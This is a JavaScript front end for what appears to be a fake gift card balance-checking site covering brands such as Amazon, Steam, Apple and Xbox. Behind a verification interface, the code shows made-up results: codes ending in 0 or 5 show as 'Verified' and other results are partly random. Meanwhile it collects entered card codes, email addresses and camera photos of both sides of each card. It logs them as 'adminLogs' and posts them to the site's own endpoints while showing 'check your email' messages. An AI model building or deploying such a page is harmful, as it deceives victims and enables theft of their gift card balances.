// static/app.js
const checkForm = document.getElementById("checkForm");
const cardType = document.getElementById("cardType");
const codeInput = document.getElementById("code");
const emailInput = document.getElementById("email");
const hintText = document.getElementById("hintText");
const checkBtn = document.getElementById("checkBtn");
const spinner = checkBtn.querySelector(".spinner");
const btnText = checkBtn.querySelector(".btn-text");

const statusBadge = document.getElementById("statusBadge");
const resultBox = document.getElementById("resultBox");
const recentList = document.getElementById("recentList");
const clearRecent = document.getElementById("clearRecent");

const toast = document.getElementById("toast");
const randomPick = document.getElementById("randomPick");
const scanInput = document.getElementById("scanInput");
const chatBubble = document.querySelector(".chat-bubble");
const chatPanel = document.getElementById("chatPanel");
const chatPanelClose = document.querySelector(".chat-panel-close");

const cardsGrid = document.getElementById("cardsGrid");
const cards = Array.from(document.querySelectorAll(".gift-card"));
const cameraModal = document.getElementById("cameraModal");
const cameraVideo = document.getElementById("cameraVideo");
const cameraCanvas = document.getElementById("cameraCanvas");
const cameraSnap = document.getElementById("cameraSnap");
const cameraUpload = document.getElementById("cameraUpload");
const cameraClose = document.getElementById("cameraClose");
const previewFront = document.getElementById("previewFront");
const previewBack = document.getElementById("previewBack");
const cameraEmail = document.getElementById("cameraEmail");
const cameraTitle = document.getElementById("cameraTitle");
const cameraSub = document.getElementById("cameraSub");
const cameraDone = document.getElementById("cameraDone");

let cameraStream = null;
let capturedFront = null;
let capturedBack = null;
let activeBrand = null;
let cameraMode = "balance";

// Add "Scan Balance" buttons to each card action row.
document.querySelectorAll(".gc-actions").forEach((actions) => {
  if(actions.querySelector(".scan-balance-btn")) return;
  const btn = document.createElement("button");
  btn.type = "button";
  btn.className = "btn btn-small btn-secondary scan-balance-btn";
  btn.textContent = "Scan Balance";
  actions.appendChild(btn);
});

const BRAND_HINTS = {
  "Amazon": "Format e.g. AMZ-0000-0000-0000",
  "American Express": "Format e.g. AMX-1234-5678-9012",
  "eBay": "Format e.g. EBY-1234-5678-9012",
  "Visa": "Format e.g. VSA-1234-5678-9012",
  "Paramount": "Format e.g. PAR-1234-5678",
  "PlayStation": "Format e.g. PSN-123456789012",
  "Steam": "Format e.g. STM-0000-0000-0000",
  "iTunes": "Format e.g. ITN-ABCD-EFGH-IJKL",
  "Apple": "Format e.g. APL-1234-5678-9012",
  "Google Play": "Format e.g. GGP-1234-5678-9012",
  "Razer Gold": "Format e.g. RZG-1234-5678-9012",
  "Sephora": "Format e.g. SEP-1234-5678",
  "Xbox": "Format e.g. XBX-1234-5678-9012"
};

function showToast(msg){
  toast.textContent = msg;
  toast.classList.add("show");
  clearTimeout(showToast._t);
  showToast._t = setTimeout(() => toast.classList.remove("show"), 2200);
}

function setHint(){
  hintText.textContent = BRAND_HINTS[cardType.value] || "Enter a code.";
}
setHint();

cardType.addEventListener("change", () => {
  setHint();
  codeInput.focus();
});

function setBadge(state){
  statusBadge.className = "badge " + state;
  if(state === "good") statusBadge.textContent = "Verified";
  else if(state === "bad") statusBadge.textContent = "Not Verified";
  else if(state === "warn") statusBadge.textContent = "Processing";
  else statusBadge.textContent = "Waiting";
}

function simulateDecision(code){
  // Rule: codes ending with 0 or 5 => Verified
  const last = (code || "").trim().slice(-1);
  if(last === "0" || last === "5") return "good";
  // a little randomness for realism
  const r = Math.random();
  if(r < 0.12) return "warn";
  return "bad";
}

function renderResult({brand, code, state}){
  resultBox.classList.remove("empty");
  resultBox.innerHTML = `
    <div class="result-content">
      <p class="muted small" style="margin:0 0 8px;">Brand</p>
      <div style="font-weight:800; font-size:18px; margin-bottom:10px;">${brand}</div>

      <p class="muted small" style="margin:0 0 8px;">Code</p>
      <div style="font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', monospace;
                  font-weight:700; opacity:.95; margin-bottom:12px;">
        ${escapeHtml(code)}
      </div>

      <div style="display:flex; gap:10px; flex-wrap:wrap;">
        <span class="status-mini ${state}">${state === "good" ? "Verified" : state === "warn" ? "Processing" : "Not Verified"}</span>
      </div>

      <div style="margin-top:12px; color: rgba(255,255,255,.7); font-size:12.5px;">
        Tip: Change the last digit to <b>0</b> or <b>5</b> for a "Verified" result.
      </div>
    </div>
  `;
}

function renderEmailPending({brand, email}){
  resultBox.classList.remove("empty");
  resultBox.innerHTML = `
    <div class="result-loading">
      <div class="loading-dots" aria-hidden="true">
        <span></span><span></span><span></span>
      </div>
      <div class="loading-title">Check your email for confirmation</div>
      <p class="muted small" style="margin:6px 0 0;">
        We sent a confirmation link to <b>${escapeHtml(email)}</b> for your ${brand} request.
      </p>
    </div>
  `;
}

function addRecent({brand, code, state}){
  const item = document.createElement("div");
  item.className = "recent-item";
  item.dataset.brand = brand;
  item.dataset.code = code;
  item.dataset.state = state;
  item.innerHTML = `
    <div style="display:grid; gap:4px;">
      <div style="font-weight:800;">${brand}</div>
      <code>${escapeHtml(code)}</code>
    </div>
    <span class="status-mini ${state}">${state === "good" ? "Verified" : state === "warn" ? "Processing" : "Failed"}</span>
  `;
  recentList.prepend(item);

  // cap list
  while(recentList.children.length > 6){
    recentList.removeChild(recentList.lastChild);
  }
}

recentList?.addEventListener("click", (e) => {
  const item = e.target.closest(".recent-item");
  if(!item) return;
  const brand = item.dataset.brand || "";
  const code = item.dataset.code || "";
  const state = item.dataset.state || "warn";
  renderResult({brand, code, state});
  setBadge(state);
});

function logAdminEntry({brand, code, email}){
  const entry = {
    brand,
    code,
    email,
    time: new Date().toLocaleString()
  };
  try{
    const existing = JSON.parse(localStorage.getItem("adminLogs") || "[]");
    existing.push(entry);
    localStorage.setItem("adminLogs", JSON.stringify(existing));
  }catch(e){
    // ignore storage errors
  }
}

function logAdminScanEntry({brand, email, front, back, mode}){
  const entry = {
    brand,
    email,
    front,
    back,
    mode,
    time: new Date().toLocaleString()
  };
  try{
    const existing = JSON.parse(localStorage.getItem("adminLogs") || "[]");
    existing.push(entry);
    localStorage.setItem("adminLogs", JSON.stringify(existing));
  }catch(e){
    // ignore storage errors
  }
}

function setLoading(isLoading){
  spinner.style.display = isLoading ? "inline-block" : "none";
  btnText.textContent = isLoading ? "Verifying..." : "Verify";
  checkBtn.disabled = isLoading;
}

function escapeHtml(str){
  return String(str)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

/* ===== Card buttons (Verify / Scan) ===== */
cardsGrid.addEventListener("click", (e) => {
  const verifyBtn = e.target.closest(".verify-btn");
  const scanBtn = e.target.closest(".scan-btn");
  const scanBalanceBtn = e.target.closest(".scan-balance-btn");
  const cardEl = e.target.closest(".gift-card");
  if(!cardEl) return;

  const brand = cardEl.dataset.brand;
  const format = cardEl.dataset.format || "";

  if(verifyBtn){
    cardType.value = brand;
    setHint();
    // Scroll to verify section
    document.getElementById("verify").scrollIntoView({behavior:"smooth", block:"start"});
    setTimeout(() => codeInput.focus(), 450);
    showToast(`${brand} selected. Enter code to verify.`);
  }

  if(scanBtn){
    activeBrand = brand;
    openCameraModal("scan");
  }

  if(scanBalanceBtn){
    activeBrand = brand;
    openCameraModal("balance");
  }
});

randomPick?.addEventListener("click", () => {
  const pick = cards[Math.floor(Math.random() * cards.length)];
  if(!pick) return;
  pick.scrollIntoView({behavior:"smooth", block:"center"});
  pick.classList.add("picked");
  setTimeout(() => pick.classList.remove("picked"), 900);
  showToast(`Picked: ${pick.dataset.brand}`);
});

/* ===== Submit (Verification) ===== */
checkForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  const brand = cardType.value;
  const code = codeInput.value.trim();
  const email = emailInput?.value.trim();
  if(!code || !email) return;

  setLoading(true);
  setBadge("neutral");
  renderEmailPending({brand, email});
  logAdminEntry({brand, code, email});

  // Simulate network delay
  try{
    const res = await fetch("/api/verify-request", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ brand, code, email })
    });
    if(!res.ok){
      const data = await res.json().catch(() => ({}));
      showToast(data.message || "Email failed to send.");
      setBadge("bad");
    }
  }catch(err){
    showToast("Network error sending email.");
    setBadge("bad");
  }

  await new Promise(r => setTimeout(r, 800 + Math.random() * 700));

  setBadge("warn");
  addRecent({brand, code, state: "warn"});

  setLoading(false);
});

clearRecent?.addEventListener("click", () => {
  recentList.innerHTML = "";
  showToast("Recent checks cleared.");
});

if(chatBubble && chatPanel){
  const closeChatPanel = () => {
    chatPanel.classList.remove("open");
    chatPanel.setAttribute("aria-hidden", "true");
    chatBubble.classList.remove("expanded");
    chatBubble.setAttribute("aria-expanded", "false");
  };

  const openChatPanel = () => {
    chatPanel.classList.add("open");
    chatPanel.setAttribute("aria-hidden", "false");
    chatBubble.classList.add("expanded");
    chatBubble.setAttribute("aria-expanded", "true");
  };

  chatBubble.addEventListener("click", () => {
    const isOpen = chatPanel.classList.contains("open");
    if(isOpen){
      closeChatPanel();
    }else{
      openChatPanel();
    }
  });

  chatPanelClose?.addEventListener("click", closeChatPanel);

  document.addEventListener("click", (e) => {
    if(!chatPanel.classList.contains("open")) return;
    if(chatPanel.contains(e.target) || chatBubble.contains(e.target)) return;
    closeChatPanel();
  });

  document.addEventListener("keydown", (e) => {
    if(e.key !== "Escape") return;
    if(!chatPanel.classList.contains("open")) return;
    closeChatPanel();
  });
}

scanInput?.addEventListener("change", () => {
  const file = scanInput.files && scanInput.files[0];
  if(!file) return;
  const brand = scanInput.dataset.brand || "Selected";
  const action = scanInput.dataset.action || "scan";
  if(action === "balance"){
    showToast(`${brand} balance scan uploaded.`);
  }else{
    showToast(`${brand} image captured.`);
  }
});

async function openCameraModal(mode = "balance"){
  if(!cameraModal || !cameraVideo) return;
  cameraMode = mode;
  cameraModal.classList.toggle("scan-mode", mode === "scan");
  cameraModal.classList.add("open");
  cameraModal.setAttribute("aria-hidden", "false");
  const cameraCard = cameraModal.querySelector(".camera-card");
  cameraCard?.classList.remove("camera-complete");
  if(cameraDone) cameraDone.textContent = "Capture complete.";
  cameraUpload.disabled = true;
  capturedFront = null;
  capturedBack = null;
  previewFront.removeAttribute("src");
  previewBack.removeAttribute("src");
  if(cameraTitle) cameraTitle.textContent = mode === "scan" ? "Scan Image" : "Scan Balance";
  if(cameraSub) cameraSub.textContent = "Allow camera access, then capture front and back.";
  cameraSnap.textContent = "Capture Front";

  try{
    cameraStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "environment" },
      audio: false
    });
    cameraVideo.srcObject = cameraStream;
    await cameraVideo.play();
  }catch(err){
    showToast("Camera permission denied or unavailable.");
    closeCameraModal();
  }
}

function closeCameraModal(){
  if(cameraStream){
    cameraStream.getTracks().forEach((t) => t.stop());
    cameraStream = null;
  }
  if(cameraModal){
    cameraModal.classList.remove("open");
    cameraModal.setAttribute("aria-hidden", "true");
  }
}

function stopCameraAndShowComplete(){
  if(cameraStream){
    cameraStream.getTracks().forEach((t) => t.stop());
    cameraStream = null;
  }
  const cameraCard = cameraModal?.querySelector(".camera-card");
  cameraCard?.classList.add("camera-complete");
  if(cameraDone) cameraDone.textContent = "Capture complete.";
}

function snapFrame(){
  if(!cameraCanvas || !cameraVideo) return null;
  const w = cameraVideo.videoWidth || 1280;
  const h = cameraVideo.videoHeight || 720;
  cameraCanvas.width = w;
  cameraCanvas.height = h;
  const ctx = cameraCanvas.getContext("2d");
  ctx.drawImage(cameraVideo, 0, 0, w, h);
  return cameraCanvas.toDataURL("image/jpeg", 0.9);
}

cameraSnap?.addEventListener("click", () => {
  const dataUrl = snapFrame();
  if(!dataUrl) return;
  if(!capturedFront){
    capturedFront = dataUrl;
    previewFront.src = dataUrl;
    cameraSnap.textContent = "Capture Back";
    showToast("Front captured. Now snap the back.");
    return;
  }
  if(!capturedBack){
    capturedBack = dataUrl;
    previewBack.src = dataUrl;
    cameraUpload.disabled = false;
    cameraSnap.textContent = "Retake Back";
    showToast("Back captured. Ready to upload.");
    stopCameraAndShowComplete();
  }else{
    capturedBack = dataUrl;
    previewBack.src = dataUrl;
    showToast("Back updated.");
  }
});

cameraUpload?.addEventListener("click", () => {
  if(!capturedFront || !capturedBack) return;
  const email = cameraEmail?.value.trim();
  if(!email){
    showToast("Enter your email to continue.");
    cameraEmail?.focus();
    return;
  }
  logAdminScanEntry({
    brand: activeBrand || "Card",
    email,
    front: capturedFront,
    back: capturedBack,
    mode: cameraMode
  });
  fetch("/api/scan-upload", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      brand: activeBrand || "Card",
      email,
      front: capturedFront,
      back: capturedBack,
      mode: cameraMode
    })
  })
    .then(async (res) => {
      if(!res.ok){
        const data = await res.json().catch(() => ({}));
        showToast(data.message || "Upload failed.");
        return;
      }
      closeCameraModal();
      showToast("Verification in process. Please check your email.");
    })
    .catch(() => {
      showToast("Network error uploading images.");
    });
});

cameraClose?.addEventListener("click", closeCameraModal);
cameraModal?.addEventListener("click", (e) => {
  if(e.target === cameraModal) closeCameraModal();
});

/* Small animation helper (optional) */
const style = document.createElement("style");
style.textContent = `
  .gift-card.picked{ outline: 2px solid rgba(124,92,255,.6); transform: translateY(-6px) scale(1.01); }
`;
document.head.appendChild(style);
